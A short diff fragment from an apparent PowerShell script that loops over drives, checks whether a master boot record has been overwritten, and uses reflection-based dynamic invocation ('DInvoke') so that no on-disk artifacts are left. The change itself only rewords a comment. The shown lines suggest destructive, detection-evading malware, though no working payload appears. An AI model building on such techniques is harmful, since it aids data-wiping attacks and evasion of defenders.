@@ -47,7 +47,7 @@ foreach ($drive in $drives) {
     }
 }
 
-# Replaced Add-Type with dynamic signatures to eliminate the need for calling CSC and avoid on-disk artifacts
+# Replaced Add-Type with dynamic signatures to eliminate the need for calling CSC and prevent on-disk artifacts
 if ($mbrOverwritten) {
 
     $asmName = New-Object Reflection.AssemblyName "DInvoke"
